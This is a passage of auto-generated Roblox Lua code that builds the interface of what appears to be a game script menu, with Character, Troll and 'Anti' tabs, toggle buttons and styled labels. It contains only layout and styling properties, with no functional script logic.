G2L["19f"] = Instance.new("UICorner", G2L["19e"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======
G2L["1a0"] = Instance.new("Frame", G2L["199"]);
G2L["1a0"]["BorderSizePixel"] = 0;
G2L["1a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a0"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["1a0"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a0"]["Name"] = [[======TITLE======]];
G2L["1a0"]["LayoutOrder"] = 1;
G2L["1a0"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text
G2L["1a1"] = Instance.new("TextLabel", G2L["1a0"]);
G2L["1a1"]["TextWrapped"] = true;
G2L["1a1"]["BorderSizePixel"] = 0;
G2L["1a1"]["TextSize"] = 14;
G2L["1a1"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1a1"]["TextTransparency"] = 0.3;
G2L["1a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a1"]["BackgroundTransparency"] = 1;
G2L["1a1"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["1a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a1"]["Text"] = [[Character]];
G2L["1a1"]["Name"] = [[text]];
G2L["1a1"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text.text
G2L["1a2"] = Instance.new("UIStroke", G2L["1a1"]);
G2L["1a2"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text.UIPadding
G2L["1a3"] = Instance.new("UIPadding", G2L["1a1"]);
G2L["1a3"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6
G2L["1a4"] = Instance.new("Frame", G2L["199"]);
G2L["1a4"]["BorderSizePixel"] = 0;
G2L["1a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a4"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1a4"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a4"]["Name"] = [[R6]];
G2L["1a4"]["LayoutOrder"] = 2;
G2L["1a4"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button
G2L["1a5"] = Instance.new("TextButton", G2L["1a4"]);
G2L["1a5"]["BorderSizePixel"] = 0;
G2L["1a5"]["TextTransparency"] = 1;
G2L["1a5"]["TextSize"] = 14;
G2L["1a5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a5"]["ZIndex"] = 50;
G2L["1a5"]["BackgroundTransparency"] = 1;
G2L["1a5"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a5"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.UIPadding
G2L["1a6"] = Instance.new("UIPadding", G2L["1a5"]);
G2L["1a6"]["PaddingTop"] = UDim.new(0, 3);
G2L["1a6"]["PaddingRight"] = UDim.new(0, 3);
G2L["1a6"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1a6"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame
G2L["1a7"] = Instance.new("Frame", G2L["1a5"]);
G2L["1a7"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1a7"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1a7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a7"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1a7"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.outlineStroke
G2L["1a8"] = Instance.new("UIStroke", G2L["1a7"]);
G2L["1a8"]["Thickness"] = 2;
G2L["1a8"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.toggleFade
G2L["1a9"] = Instance.new("CanvasGroup", G2L["1a7"]);
G2L["1a9"]["BorderSizePixel"] = 0;
G2L["1a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a9"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a9"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.toggleFade.UIGradient
G2L["1aa"] = Instance.new("UIGradient", G2L["1a9"]);
G2L["1aa"]["Rotation"] = 90;
G2L["1aa"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text
G2L["1ab"] = Instance.new("TextLabel", G2L["1a4"]);
G2L["1ab"]["TextWrapped"] = true;
G2L["1ab"]["ZIndex"] = 10;
G2L["1ab"]["BorderSizePixel"] = 0;
G2L["1ab"]["TextSize"] = 14;
G2L["1ab"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ab"]["BackgroundTransparency"] = 1;
G2L["1ab"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["1ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ab"]["Text"] = [[R6]];
G2L["1ab"]["Name"] = [[text]];
G2L["1ab"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text.UIPadding
G2L["1ac"] = Instance.new("UIPadding", G2L["1ab"]);
G2L["1ac"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text.text
G2L["1ad"] = Instance.new("UIStroke", G2L["1ab"]);
G2L["1ad"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.UIPadding
G2L["1ae"] = Instance.new("UIPadding", G2L["1a4"]);
G2L["1ae"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset
G2L["1af"] = Instance.new("Frame", G2L["199"]);
G2L["1af"]["BorderSizePixel"] = 0;
G2L["1af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1af"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["1af"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1af"]["Name"] = [[Reset]];
G2L["1af"]["LayoutOrder"] = 2;
G2L["1af"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button
G2L["1b0"] = Instance.new("TextButton", G2L["1af"]);
G2L["1b0"]["BorderSizePixel"] = 0;
G2L["1b0"]["TextTransparency"] = 1;
G2L["1b0"]["TextSize"] = 14;
G2L["1b0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b0"]["ZIndex"] = 49;
G2L["1b0"]["BackgroundTransparency"] = 1;
G2L["1b0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b0"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.UIPadding
G2L["1b1"] = Instance.new("UIPadding", G2L["1b0"]);
G2L["1b1"]["PaddingTop"] = UDim.new(0, 2);
G2L["1b1"]["PaddingRight"] = UDim.new(0, 3);
G2L["1b1"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1b1"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame
G2L["1b2"] = Instance.new("Frame", G2L["1b0"]);
G2L["1b2"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1b2"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1b2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1b2"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1b2"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.outlineStroke
G2L["1b3"] = Instance.new("UIStroke", G2L["1b2"]);
G2L["1b3"]["Thickness"] = 2;
G2L["1b3"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.buttonFade
G2L["1b4"] = Instance.new("CanvasGroup", G2L["1b2"]);
G2L["1b4"]["BorderSizePixel"] = 0;
G2L["1b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b4"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b4"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.buttonFade.UIGradient
G2L["1b5"] = Instance.new("UIGradient", G2L["1b4"]);
G2L["1b5"]["Rotation"] = 90;
G2L["1b5"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.text
G2L["1b6"] = Instance.new("TextLabel", G2L["1b0"]);
G2L["1b6"]["ZIndex"] = 2;
G2L["1b6"]["BorderSizePixel"] = 0;
G2L["1b6"]["TextSize"] = 14;
G2L["1b6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b6"]["BackgroundTransparency"] = 1;
G2L["1b6"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b6"]["Text"] = [[Reset Character]];
G2L["1b6"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.text.text
G2L["1b7"] = Instance.new("UIStroke", G2L["1b6"]);
G2L["1b7"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.fillbar
G2L["1b8"] = Instance.new("Frame", G2L["1af"]);
G2L["1b8"]["ZIndex"] = 90;
G2L["1b8"]["BorderSizePixel"] = 0;
G2L["1b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b8"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["1b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b8"]["Name"] = [[fillbar]];
G2L["1b8"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll
G2L["1b9"] = Instance.new("ScrollingFrame", G2L["35"]);
G2L["1b9"]["Visible"] = false;
G2L["1b9"]["Active"] = true;
G2L["1b9"]["BorderSizePixel"] = 0;
G2L["1b9"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["1b9"]["Name"] = [[Troll]];
G2L["1b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b9"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["1b9"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b9"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["1b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b9"]["ScrollBarThickness"] = 0;
G2L["1b9"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.rightside
G2L["1ba"] = Instance.new("Frame", G2L["1b9"]);
G2L["1ba"]["BorderSizePixel"] = 0;
G2L["1ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ba"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["1ba"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["1ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ba"]["Name"] = [[rightside]];
G2L["1ba"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.rightside.UIListLayout
G2L["1bb"] = Instance.new("UIListLayout", G2L["1ba"]);
G2L["1bb"]["Padding"] = UDim.new(0, 5);
G2L["1bb"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.leftside
G2L["1bc"] = Instance.new("Frame", G2L["1b9"]);
G2L["1bc"]["BorderSizePixel"] = 0;
G2L["1bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bc"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["1bc"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["1bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bc"]["Name"] = [[leftside]];
G2L["1bc"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.leftside.UIListLayout
G2L["1bd"] = Instance.new("UIListLayout", G2L["1bc"]);
G2L["1bd"]["Padding"] = UDim.new(0, 5);
G2L["1bd"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain
G2L["1be"] = Instance.new("ScrollingFrame", G2L["35"]);
G2L["1be"]["Visible"] = false;
G2L["1be"]["Active"] = true;
G2L["1be"]["BorderSizePixel"] = 0;
G2L["1be"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["1be"]["Name"] = [[TCOMain]];
G2L["1be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1be"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["1be"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1be"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["1be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1be"]["ScrollBarThickness"] = 0;
G2L["1be"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside
G2L["1bf"] = Instance.new("Frame", G2L["1be"]);
G2L["1bf"]["BorderSizePixel"] = 0;
G2L["1bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bf"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["1bf"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["1bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bf"]["Name"] = [[rightside]];
G2L["1bf"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.UIListLayout
G2L["1c0"] = Instance.new("UIListLayout", G2L["1bf"]);
G2L["1c0"]["Padding"] = UDim.new(0, 5);
G2L["1c0"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab
G2L["1c1"] = Instance.new("Frame", G2L["1bf"]);
G2L["1c1"]["BorderSizePixel"] = 0;
G2L["1c1"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["1c1"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["1c1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c1"]["Name"] = [[antiTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.antiScriptTCO
G2L["1c2"] = Instance.new("LocalScript", G2L["1c1"]);
G2L["1c2"]["Name"] = [[antiScriptTCO]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======
G2L["1c3"] = Instance.new("Frame", G2L["1c1"]);
G2L["1c3"]["BorderSizePixel"] = 0;
G2L["1c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c3"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["1c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c3"]["Name"] = [[======ACCENT======]];
G2L["1c3"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======.GuiColor
G2L["1c4"] = Instance.new("Frame", G2L["1c3"]);
G2L["1c4"]["BorderSizePixel"] = 0;
G2L["1c4"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["1c4"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["1c4"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["1c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c4"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======.GuiColor.UICorner
G2L["1c5"] = Instance.new("UICorner", G2L["1c4"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.UIListLayout
G2L["1c6"] = Instance.new("UIListLayout", G2L["1c1"]);
G2L["1c6"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["1c6"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======
G2L["1c7"] = Instance.new("Frame", G2L["1c1"]);
G2L["1c7"]["BorderSizePixel"] = 0;
G2L["1c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c7"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["1c7"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c7"]["Name"] = [[======TITLE======]];
G2L["1c7"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text
G2L["1c8"] = Instance.new("TextLabel", G2L["1c7"]);
G2L["1c8"]["TextWrapped"] = true;
G2L["1c8"]["BorderSizePixel"] = 0;
G2L["1c8"]["TextSize"] = 14;
G2L["1c8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1c8"]["TextTransparency"] = 0.3;
G2L["1c8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c8"]["BackgroundTransparency"] = 1;
G2L["1c8"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["1c8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c8"]["Text"] = [[Anti]];
G2L["1c8"]["Name"] = [[text]];
G2L["1c8"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text.text
G2L["1c9"] = Instance.new("UIStroke", G2L["1c8"]);
G2L["1c9"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text.UIPadding
G2L["1ca"] = Instance.new("UIPadding", G2L["1c8"]);
G2L["1ca"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.minimise
G2L["1cb"] = Instance.new("TextButton", G2L["1c7"]);
G2L["1cb"]["BorderSizePixel"] = 0;
G2L["1cb"]["TextTransparency"] = 0.3;
G2L["1cb"]["TextSize"] = 14;
G2L["1cb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1cb"]["BackgroundTransparency"] = 1;
G2L["1cb"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["1cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cb"]["Text"] = [[-]];
G2L["1cb"]["Name"] = [[minimise]];
G2L["1cb"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.greystroke
G2L["1cc"] = Instance.new("UIStroke", G2L["1c1"]);
G2L["1cc"]["ZIndex"] = 99;
G2L["1cc"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["1cc"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1cc"]["Name"] = [[greystroke]];
G2L["1cc"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan
G2L["1cd"] = Instance.new("Frame", G2L["1c1"]);
G2L["1cd"]["BorderSizePixel"] = 0;
G2L["1cd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cd"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1cd"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cd"]["Name"] = [[maptidenan]];
G2L["1cd"]["LayoutOrder"] = 2;
G2L["1cd"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button
G2L["1ce"] = Instance.new("TextButton", G2L["1cd"]);
G2L["1ce"]["BorderSizePixel"] = 0;
G2L["1ce"]["TextTransparency"] = 1;
G2L["1ce"]["TextSize"] = 14;
G2L["1ce"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ce"]["BackgroundTransparency"] = 1;
G2L["1ce"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ce"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.UIPadding
G2L["1cf"] = Instance.new("UIPadding", G2L["1ce"]);
G2L["1cf"]["PaddingTop"] = UDim.new(0, 3);
G2L["1cf"]["PaddingRight"] = UDim.new(0, 3);
G2L["1cf"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1cf"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame
G2L["1d0"] = Instance.new("Frame", G2L["1ce"]);
G2L["1d0"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1d0"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1d0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1d0"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1d0"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.outlineStroke
G2L["1d1"] = Instance.new("UIStroke", G2L["1d0"]);
G2L["1d1"]["Thickness"] = 2;
G2L["1d1"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.toggleFade
G2L["1d2"] = Instance.new("CanvasGroup", G2L["1d0"]);
G2L["1d2"]["BorderSizePixel"] = 0;
G2L["1d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d2"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d2"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.toggleFade.UIGradient
G2L["1d3"] = Instance.new("UIGradient", G2L["1d2"]);
G2L["1d3"]["Rotation"] = 90;
G2L["1d3"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text
G2L["1d4"] = Instance.new("TextLabel", G2L["1cd"]);
G2L["1d4"]["TextWrapped"] = true;
G2L["1d4"]["BorderSizePixel"] = 0;
G2L["1d4"]["TextSize"] = 14;
G2L["1d4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1d4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d4"]["BackgroundTransparency"] = 1;
G2L["1d4"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1d4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d4"]["Text"] = [[Anti Maptide NaN]];
G2L["1d4"]["Name"] = [[text]];
G2L["1d4"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text.UIPadding
G2L["1d5"] = Instance.new("UIPadding", G2L["1d4"]);
G2L["1d5"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text.text
G2L["1d6"] = Instance.new("UIStroke", G2L["1d4"]);
G2L["1d6"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.UIPadding
G2L["1d7"] = Instance.new("UIPadding", G2L["1cd"]);
G2L["1d7"]["PaddingLeft"] = UDim.new(0, 2);


